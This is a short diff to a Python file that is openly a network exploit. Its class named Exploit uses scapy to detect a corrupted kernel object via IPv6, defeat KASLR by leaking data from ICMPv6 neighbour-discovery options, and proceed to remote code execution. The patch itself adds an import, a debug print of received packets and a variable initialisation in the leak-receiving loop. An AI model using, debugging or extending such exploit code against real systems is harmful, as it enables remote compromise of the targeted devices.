@@ -12,6 +12,7 @@ from struct import pack, unpack
 from sys import exit
 from time import sleep
 from offsets import *
+from scapy.layers.inet6 import ICMPv6NDOptSrcLLAddr, IPv6
 import time
 import traceback
 
@@ -754,6 +755,7 @@ class Exploit():
         print(
             '[+] Scanning for corrupted object...found {}'.format(source_ipv6))
 
+      
         print('')
         print('[+] STAGE 2: KASLR defeat')
 
@@ -762,9 +764,11 @@ class Exploit():
         start_time = time.time()
         timeout = 60  # Maximum wait time (e.g., 60 seconds)
 
+        pkt = None
         while True:
                 try:
                         pkt = self.s.recv()
+                        print(f'[DEBUG] Packet received: {pkt.summary()}')  # Add this line to print a summary of the packet
                         if pkt and pkt.haslayer(ICMPv6NDOptSrcLLAddr) and pkt[ICMPv6NDOptSrcLLAddr].len > 1:
                                 break
                 except Exception as e:
@@ -798,6 +802,7 @@ class Exploit():
                 print(f'[-] Error processing packet: {e}')
                 traceback.print_exc()
                 exit(1)
+
 
         print('')
         print('[+] STAGE 3: Remote code execution')
